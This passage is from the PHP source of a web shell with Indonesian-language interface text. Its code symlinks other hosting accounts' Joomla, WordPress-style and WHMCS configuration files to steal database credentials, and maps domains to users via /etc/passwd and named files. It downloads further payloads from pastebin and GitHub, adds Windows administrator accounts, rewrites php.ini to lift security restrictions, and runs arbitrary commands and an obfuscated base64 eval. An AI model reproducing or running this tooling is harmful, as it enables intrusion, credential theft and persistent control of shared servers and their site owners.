 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/web/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/joomla/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/site/configuration.php',"pee/".$etcc[0].'-Joomla.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/conf_global.php',"pee/".$etcc[0].'-IPB.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/inc/config.php',"pee/".$etcc[0].'-MyBB.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/Settings.php',"pee/".$etcc[0].'-SMF.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/sites/default/settings.php',"pee/".$etcc[0].'-Drupal.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/e107_config.php',"pee/".$etcc[0].'-e107.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/datas/config.php',"pee/".$etcc[0].'-Seditio.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/includes/configure.php',"pee/".$etcc[0].'-osCommerce.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/client/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/clientes/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/support/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/supportes/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/whmcs/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/domain/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/hosting/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/whmc/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/billing/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/portal/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/order/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/clientarea/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
 symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/domains/configuration.php',"pee/".$etcc[0].'-WHMCS.txt');
 } if(is_readable("/var/named")){ echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" >';
 echo'<tr><td><center><b>SITE</b></center></td><td>
					<center><b>USER</b></center></td>
					<td></center><b>SYMLINK</b></center></td>';
 $list = scandir("/var/named");
 foreach($list as $domain){ if(strpos($domain,".db")){ $i += 1;
 $domain = str_replace('.db','',$domain);
 $owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
 echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td>
					<td class='td1'><center><font color='red'>".$owner['name']."</font></center></td>
					<td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
 } } echo "<center>Total Domains Found: ".$i."</center><br />";
 }else{ echo "<tr><td class='td1'>can't read [ /var/named ]</td><tr>";
 } 
 error_reporting(0);
 $etc = file_get_contents("/etc/passwd");
 $etcz = explode("
",$etc);
 if(is_readable("/etc/passwd")){ echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" >';
 echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td><center><b>SYMLINK</b></center></td>';
 $list = scandir("/var/named");
 foreach($etcz as $etz){ $etcc = explode(":",$etz);
 foreach($list as $domain){ if(strpos($domain,".db")){ $domain = str_replace('.db','',$domain);
 $owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
 if($owner['name'] == $etcc[0]) { $i += 1;
 echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td><center>
				<td class='td1'><font color='red'>".$owner['name']."</font></center></td>
				<td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
 }}}} echo "<center>Total Domains Found: ".$i."</center><br />";
} 
 if(is_readable("/etc/named.conf")){ echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" >';
 echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td></center><b>SYMLINK</b></center></td>';
 $named = file_get_contents("/etc/named.conf");
 preg_match_all('%zone \"(.*)\" {%',$named,$domains);
 foreach($domains[1] as $domain){ $domain = trim($domain);
 $i += 1;
 $owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
 echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td><td class='td1'><center><font color='red'>".$owner['name']."</font></center></td><td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
 } echo "<center>Total Domains Found: ".$i."</center><br />";
 } else { echo "<tr><td class='td1'>can't read [ /etc/named.conf ]</td></tr>";
 } 
 if(is_readable("/etc/valiases")){ echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" >';
 echo'<tr><td><center><b>SITE</b></center></td><td>
				<center><b>USER</b></center></td><td></center>
				<b>SYMLINK</b></center></td>';
 $list = scandir("/etc/valiases");
 foreach($list as $domain){ $i += 1;
 $owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
 echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td>
				<center><td class='td1'><font color='red'>".$owner['name']."</font></center></td>
				<td class='td1'><center><a href='pee/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
 } echo "<center>Total Domains Found: ".$i."</center><br />";
 } else { echo "<tr><td class='td1'>can't read [ /etc/valiases ]</td></tr>";
 } 
 } elseif(isset($_GET['x']) && ($_GET['x'] == 'dump')) { 
?>
				<br/><br/>
				<form action="?path=
<?php echo $path;
 
?>&amp;
x=dump" method="post">
				
<?php $pilih = $_POST['pilihan'];
 echo'<center>
				<table border=1>
				<select class="bordergaya" align="left" name="pilihan" id="pilih">
				<option value="dumper">Gate 1</option>
				</select>
				<input type="submit" name="submites" class="bordergaya" value="Click here for Dump Email">';

?>
<?php if ( $pilih == "dumper") { $files = file_get_contents("http://pastebin.com/raw/HhiURUER");
 file_put_contents("dumper.php",$files);
 echo "<script>alert('Done! Access dumper.php for processing');
 hideAll();
</script>";
 echo "<a href=".'dumper.php'." target=_blank><br/><br/><b>dumper.php [Click here]</b></a></center>";
 die();
 } echo'</td></form></tr></table>';
 
 } if(isset($_GET['x']) && ($_GET['x'] == 'krdp')) { if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') { 
?><br/><br/>
						<div id="content-left">
								<form action="" method="post">
								<table border="1px" bordercolor="#2d2b2b" cellpadding="5px">
									<tr>
										<td colspan="3" align="center" bgcolor="#2d2b2b"><font face="Fredericka the Great" size="2px" color="white">CREATE RDP</font></td>
									</tr>
									<tr>
										<td><font class='kecew'>Username</font></td>
										<td><font class='kecew'> : </font></td>
										<td><input type="text" class="bordergaya" name="username" required></td>
									</tr>
									<tr>
										<td><font class='kecew'>Password</font></td>
										<td><font class='kecew'> : </font></td>
										<td><input type="text" class="bordergaya" name="password" required></td>
									</tr>
									<tr>
										<td colspan="3" align="center"><input type="hidden" name="kshell" value="1"><input type="submit" name="submit" class="bordergaya" value="Create"></td>
									</tr>
								</table>
								</form>
								</div>
								<br/>
								<div id="content-left">
								<form action="" method="post">
									<table border="1px" bordercolor="#2d2b2b" cellpadding="5px">
										<tr>
											<td colspan="3" align="center" bgcolor="#2d2b2b"><font face="Fredericka the Great" size="2px" color="white">OPTION</td>
										</tr>
										<tr>
											<td><font class='kecew'>Username</font></td>
											<td><font class='kecew'> : </font></td>
											<td><input type="text" name="rusername" placeholder="Masukan Username" class="bordergaya"></td>
										</tr>
										<tr>
											<td><font class='kecew'>Password</font></td>
											<td><font class='kecew'> : </font></td>
											<td><input type="text" name="gantipw" placeholder="Password Baru" class="bordergaya"></td>
										</tr>
										<tr>
											<td><font class='kecew'>Action</font></td>
											<td><font class='kecew'> : </font></td>
											<td>
												<select name="aksi" class="bordergaya">
														<option value="1">Tampilkan Username</option>
														<option value="2">Hapus Username</option>
														<option value="3">Ubah Password</option>
												</select>
											</td>
										</tr>
										<tr>
											<td colspan="3" align="center"><input type="hidden" name="kshell" value="2"><input type="submit" name="submit" class="bordergaya" value=">"></td>
										</tr>
									</table>
								</form>
								<br/>
						</div>
						</center></center>
					
<?php if($_POST['submit']) { if($_POST['kshell']=="1") { $r_user = $_POST['username'];
 $r_pass = $_POST['password'];
 $cmd_cek_user = shell_exec("net user");
 if(preg_match("/$r_user/", $cmd_cek_user)){ echo $gaya_root.$r_user." sudah ada".$o;
 }else { $cmd_add_user = shell_exec("net user ".$r_user." ".$r_pass." /add");
 $cmd_add_groups1 = shell_exec("net localgroup Administrators ".$r_user." /add");
 $cmd_add_groups2 = shell_exec("net localgroup Administrator ".$r_user." /add");
 $cmd_add_groups3 = shell_exec("net localgroup Administrateur ".$r_user." /add");
 if($cmd_add_user){ echo $gaya_root."<font class='rapihbanget'>[+] Menambahkan User : ".$r_user." Password : ".$r_pass." <font color='greenyellow'>Berhasil!</font></font><br/><br/>".$o;
 }else { echo $gaya_root."<font class='rapihbanget'>[+] Menambahkan User : ".$r_user." Password : ".$r_pass." <font color='red'>Gagal!</font><br/><br/>".$o;
 } echo "<font class='rapihbanget'>[+] Sedang Memroses User.. Silahkan Tunggu Sebentar.. <br/>";
 if($cmd_add_groups1){ echo $gaya_root."<font class='rapihbanget'>--- Selamat! User ".$r_user." <font color='greenyellow'>Berhasil Di Proses!</font><br/><br/>".$o;
 }else if($cmd_add_groups2){ echo $gaya_root."<font class='rapihbanget'>--- Selamat! User ".$r_user." <font color='greenyellow'>Berhasil Di Proses!</font><br/><br/>".$o;
 }else if($cmd_add_groups3){ echo $gaya_root."<font class='rapihbanget'>--- Selamat! User ".$r_user." <font color='greenyellow'>Berhasil Di Proses!</font><br/><br/>".$o;
 }else { echo $gaya_root."<font class='rapihbanget'>--- Maaf User ".$r_user." <font color='red'>Gagal Di Proses!</font><br/><br/>".$o;
 } echo "<font class='rapihbanget'>[+] Server Info : </font><br/>";
 echo $gaya_root."<font class='rapihbanget'>--- ServerIP : ".$_SERVER["HTTP_HOST"]."</font><br/><font class='rapihbanget'>--- Username : ".$r_user."</font><br/><font class='rapihbanget'>--- Password : </font>".$r_pass.$o."</font><br/><br/>";
 echo "<font class='rapihbanget'>[+] Thank For Using It ~_^ </font><br/><br/>";
 } } else if($_POST['kshell']=="2") { echo "<style>
									.coeg{margin-left:30%;
}
									</style>";
 if($_POST['aksi']=="1"){ echo "<pre class='coeg'>".shell_exec("net user");
 } else if($_POST['aksi']=="2") { $username = $_POST['rusername'];
 $cmd_cek_user = shell_exec("net user");
 if (!empty($username)){ if(preg_match("/$username/", $cmd_cek_user)){ $cmd_add_user = shell_exec("net user ".$username." /DELETE");
 if($cmd_add_user){ echo "<font class='rapihbanget'>[+] Sedang Memroses.. Silahkan Tunggu.. </font><br /><br />";
 echo $gaya_root."<font class='rapihbanget'>[+] Selamat! Remove User </font><font color='orange'>".$username." </font><font color='greenyellow'>Berhasil!!</font><br /><br />".$o;
 }else { echo $gaya_root."<font class='rapihbanget'>[+] Yah :( Remove User </font><font color='orange'>".$username." </font><font color='red'>Gagal!!</font><br /><br />".$o;
 } }else { echo $gaya_root."<font class='rapihbanget'>Are You Kidding Me?! Username : </font><font color='orange'>" .$username. " </font><font color='red'> Itu Enggak Ada!!</font><br /><br />".$o;
 } }else { echo $gaya_root."<font class='rapihbanget'> Silahkan Masukkan Dahulu Username Yang Mau Di Hapus!! </font><br /><br />".$o;
 } } else if($_POST['aksi']=="3") { echo "<style>
										.tengahaja{margin-left:35%}
									 </style>";
 $username = $_POST['rusername'];
 $password = $_POST['gantipw'];
 $cmd_cek_user = shell_exec("net user");
 if (!empty($username)){ if(preg_match("/$username/", $cmd_cek_user)){ $cmd_add_user = shell_exec("net user ".$username."");
 if($cmd_add_user){ echo $gaya_root."<font class='tengahaja'>Ganti Password Username : ".$username." dan Password : ".$password." <font color='greenyellow'>Berhasil!!</font><br /><br />".$o;
 }else { echo $gaya_root."<font class='tengahaja'>Ganti Password Username : ".$username." dan Password : ".$password." <font color='red'>Gagal!!</font><br /><br />".$o;
 } }else { echo $gaya_root."<font class='rapihbanget'>Are You Kidding Me?! Username : </font><font color='orange'>" .$username. " </font><font color='red'> Itu Enggak Ada!!</font><br /><br />".$o;
 } }else { echo $gaya_root."<font class='rapihbanget'> Silahkan Masukkan Dahulu Username Yang Mau Di Hapus!! </font><br /><br />".$o;
 } } } } } else{ echo "<br><br><font color='springgreen' face='Fredericka The Great'>TOOLS GAK BISA DI PAKE NDAN -_- SERVERNYA BUKAN WINDOWS</font>";
 }
 } elseif(isset($_GET['x']) && ($_GET['x'] == 'fcrot')) { echo'<center><br><br><h3>File Creator [Auto upload]</h3>
				<table>
				<tr><form method="post" action="">&nbsp;
<td>
				<select class="bordergaya" align="left" name="pilihan" id="pilih">
				<option value="hsphere">Bypass hSphere Shell</option>
				<option value="adminer">Adminer</option>
				</select>
				<input type="submit" name="submites" class="bordergaya" value="create">
				</td></form></tr></table>';
 error_reporting(0);
 set_time_limit(0);
 $submit = $_POST ['submites'];
 if(isset($submit)) { $pilih = $_POST['pilihan'];
 if ( $pilih == 'hsphere') { $files = file_get_contents("https://raw.githubusercontent.com/sinkaroid/pasirmerah/sc0/sc0hsphere.php");
 file_put_contents("hsphere.php",$files);
 echo "<script>alert('Bypass hsphere shell created!');
 hideAll();
</script>";
 echo "<a href="."hsphere.php"." target=_blank><b>hsphere.php [Click here]</b></a></center>";
 die();
 } elseif ( $pilih == 'adminer') { getfile("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php");
 echo "<script>alert('adminer created!');
 hideAll();
</script>";
 echo "<a href="."adminer.php"." target=_blank><b>adminer.php [Click here]</b></a></center>";
 die();
 } }
 } elseif(isset($_GET['x']) && ($_GET['x'] == 'korong')) { echo '<center><br /><br />
						<form enctype="multipart/form-data" method="POST">
							<input type="file" name="file" id="file" class="inputfile inputfile-4" />
							<label for="file">
								<image>
									<image src="kano.png" width="170" height="170" viewBox="0 0 20 17">
								</image> 
								<br>
								<span>TOUCH MY FACE</span>
							</label>';
 
?>
							<script type="text/javascript">
									/*
										By Osvaldas Valutis, www.osvaldas.info
										Available for use under the MIT License
									*/
									'use strict';

									;
( function ( document, window, index )
									{
										var inputs = document.querySelectorAll( '.inputfile' );
										Array.prototype.forEach.call( inputs, function( input )
										{
											var label	 = input.nextElementSibling,
												labelVal = label.innerHTML;

											input.addEventListener( 'change', function( e )
											{
												var fileName = '';
												if( this.files && this.files.length > 1 )
													fileName = ( this.getAttribute( 'data-multiple-caption' ) || '' ).replace( '{count}', this.files.length );
												else
													fileName = e.target.value.split( '\\' ).pop();

												if( fileName )
													label.querySelector( 'span' ).innerHTML = fileName;
												else
													label.innerHTML = labelVal;
											});

											// Firefox bug fix
											input.addEventListener( 'focus', function(){ input.classList.add( 'has-focus' );
 });
											input.addEventListener( 'blur', function(){ input.classList.remove( 'has-focus' );
 });
										});
									}( document, window, 0 ));
							</script>
							
<?php echo'<br/>
							<input type="submit" class="tombolupil" value="Upload File!" />
						</form>';
 if(isset($_FILES['file'])){ if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){ echo '<script>alert("File Sukses Di Upload!");
</script>';
 }else{ echo '<script>alert("File Gagal Di Upload!");
</script>';
 } } echo "</center><br /><br />";
 
 } elseif(isset($_GET['x']) && ($_GET['x'] == 'cmd')) { echo "<br/><br/><form method='post'>
				<font clss='rapihbanget'>Command :</font>
				<input class='bordergaya' type='text' size='30' height='10' name='cmd'><input type='submit' class='bordergaya' name='execmd' value=' > '>
				</form>";
 if($_POST['execmd']) { echo "<pre>".exe($_POST['cmd'])."</pre>";
 } } elseif(isset($_GET['x']) && ($_GET['x'] == 'bypstuls')) { echo "<br/><br/>###<br/><br/>";
 
?>
					<a href="?
<?php echo "path=".$path;
 
?>&amp;
x=bysysfuncwsf"><input class=bordergaya type=submit value="Bypass Root Path With System Function" /></a>
					Or <a href="?
<?php echo "path=".$path;
 
?>&amp;
x=bypsini"><input class=bordergaya type=submit value="Bypass Disable Functions" /></a>
					Or <a href="?
<?php echo "path=".$path;
 
?>&amp;
x=bysysfuncwexec"><input class=bordergaya type=submit value="Bypass Root Path With Exec Function" /></a>
					<br/><br/><br/><br/>
					
<?php } elseif(isset($_GET['x']) && ($_GET['x'] == 'bysysfuncwsf')) { echo '<br><center><span style="font-size:20px;
 font-family:Fredericka the Great;
 color:orange">Bypass Root Path With System Function</span><center>';
 mkdir('bysyswsf', 0755);
 chdir('bysyswsf');
 $bysyswsf = file_get_contents("http://pastebin.com/raw/nUTTPQnm");
 $file = fopen("bysyswsf.php" ,"w+");
 $write = fwrite ($file ,$bysyswsf);
 fclose($file);
 chmod("bysyswsf.php",0755);
 echo "<iframe src=bysyswsf/bysyswsf.php width=70% height=70% frameborder=0></iframe>";
 } elseif(isset($_GET['x']) && ($_GET['x'] == 'bypsini')) { $byht = "safe_mode = Off
					disable_functions = None
					safe_mode_gid = OFF
					open_basedir = OFF
					allow_url_fopen = On";
 file_put_contents("php.ini",$byht);
 echo "<script>alert('Congrats! Sukses Bos Q ~_^');
 hideAll();
</script>";
 die('<meta http-equiv="refresh" content="0;
 url=?" />');
 } elseif(isset($_GET['x']) && ($_GET['x'] == 'bysysfuncwexec')) { echo '<br><center><span style="font-size:20px;
 font-family:Fredericka the Great;
 color:orange">Bypass Root Path With Exec Function</span><center>';
 mkdir('bysyswexecf', 0755);
 chdir('bysyswexecf');
 $bysyswsf = file_get_contents("http://pastebin.com/raw/KJiLdADd");
 $file = fopen("bysyswexecf.php" ,"w+");
 $write = fwrite ($file ,$bysyswsf);
 fclose($file);
 chmod("bysyswexecf.php",0755);
 echo "<iframe src=bysyswexecf/bysyswexecf.php width=70% height=70% frameborder=0></iframe>";
 } elseif(isset($_GET['x']) && ($_GET['x'] == 'jumping')){ 
?>
				<form action="?path=
<?php echo $pwd;
 
?>&amp;
x=jumping" method="post">
				
<?php ($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<b>Error: safe_mode = on</b>');
 set_time_limit(0);
 @$passwd = fopen('/etc/passwd','r');
 if (!$passwd) { die('<br>[-] Error : coudn`t read /etc/passwd');
 } $pub = array();
 $users = array();
 $conf = array();
 $i = 0;
 while(!feof($passwd)) { $str = fgets($passwd);
 if ($i > 35) { $pos = strpos($str,':');
 $username = substr($str,0,$pos);
 $dirz = '/home/'.$username.'/public_html/';
 if (($username != '')) { if (is_readable($dirz)) { array_push($users,$username);
 array_push($pub,$dirz);
 } } } $i++;
 } echo '<br><br></center></center>';
 echo "<font class='rapihbanget'>[+] Founded ".sizeof($users)." entrys in /etc/passwd
"."<br /></font>";
 echo "<font class='rapihbanget'>[+] Founded ".sizeof($pub)." readable public_html directories
"."<br /></font>";
 echo "<font class='rapihbanget'>[~] Searching for passwords in config files...<br /><br /></font>";
 foreach ($users as $user) { $path = "/home/$user/public_html/";
 echo "<font class='rapihbanget'><a href='?path&#61;
$path' target='_blank' font-weight:bold;
 color:#F80;
'>$path</a><br></font>";
 } echo "<br /><font class='rapihbanget'>[+] Complete...
"."<br /></font>";
 echo "<font class='rapihbanget'>[+] Monggo Sikat Boz!
"."<br /></font>";
 echo '<br><br></b></body><center>';
 } elseif(isset($_GET['x']) && ($_GET['x'] == 'zonesH')){ echo "<br/><br/>";
@eval(gzinflate(base64_decode($zoneH)));
 "</div>";
 } else{ echo '</table><br />';
 echo "<center>";
 if(isset($_GET['option']) && $_POST['opt'] == 'delete'){ if($_POST['type'] == 'dir'){ if(rmdir($_POST['path'])){ echo '<script>alert("Delete Dir Sukses!");
</script>';
 }else{ echo '<script>alert("Delete Dir Gagal!");
</script>';
 } }elseif($_POST['type'] == 'file'){ if(unlink($_POST['path'])){ echo '<script>alert("Delete File Sukses!");
</script>';
 }else{ echo '<script>alert("Delete File Gagal!");
</script>';
 } } } echo '</center>';
 $scandir = scandir($path);
 echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
			';
 foreach($scandir as $dir){ if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
 echo "<tr>
			<td><a style='color:white;
 font-family:Ubuntu Mono;
' href=\"?path=$path/$dir\">$dir</a></td>
			<td><center style='color:gold;
 font-family:Ubuntu Mono;
'>--</center></td>
			<td><center>";
 if(is_writable("$path/$dir")) echo "<font style='color:springgreen;
 font-family:Ubuntu Mono;
'>";
 elseif(!is_readable("$path/$dir")) echo "<font style='color:red;
 font-family:Ubuntu Mono;
'>";
 echo perms("$path/$dir");
 if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
 echo "</center></td>
			<td width='26%'><center><form method=\"POST\" action=\"?option&path=$path\">
			<select class='bordergaya' name=\"opt\">
			<option value=\"\"></option>
			<option value=\"delete\">Rm</option>
			<option value=\"chmod\">Chmd</option>
			<option value=\"rename\">Rn</option>
			</select>
			<input type=\"hidden\" name=\"type\" value=\"dir\">
			<input type=\"hidden\" name=\"name\" value=\"$dir\">
			<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
			<input class='bordergaya' type=\"submit\" value=\">\" />
			</form></center></td>
			</tr>";
 } echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
 foreach($scandir as $file){ if(!is_file("$path/$file")) continue;
 $size = filesize("$path/$file")/1024;
 $size = round($size,3);
 if($size >= 1024){ $size = round($size/1024,2).' MB';
 }else{ $size = $size.' KB';
 } echo "<tr>
			<td><a style='color:white;
 font-family:Ubuntu Mono;
' href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
			<td><center style='color:orange;
 font-family:Ubuntu Mono;
'>".$size."</center></td>
			<td><center>";
 if(is_writable("$path/$file")) echo "<font style='color:springgreen;
 font-family:Ubuntu Mono;
'>";
 elseif(!is_readable("$path/$file")) echo "<font style='color:red;
 font-family:Ubuntu Mono;
'>";
 echo perms("$path/$file");
 if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
 echo "</center></td>
			<td width='26%'><center><form method=\"POST\" action=\"?option&path=$path\">
			<select class='bordergaya' name=\"opt\">
			<option value=\"\"></option>
			<option value=\"delete\">Rm</option>
			<option value=\"chmod\">Chmd</option>
			<option value=\"rename\">Rn</option>
			<option value=\"edit\">E</option>
			</select>
			<input type=\"hidden\" name=\"type\" value=\"file\">
			<input type=\"hidden\" name=\"name\" value=\"$file\">
			<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
			<input class='bordergaya' type=\"submit\" value=\">\" />
			</form></center></td>
			</tr>";
 } echo '</table>
			</div>';
 } 
?>
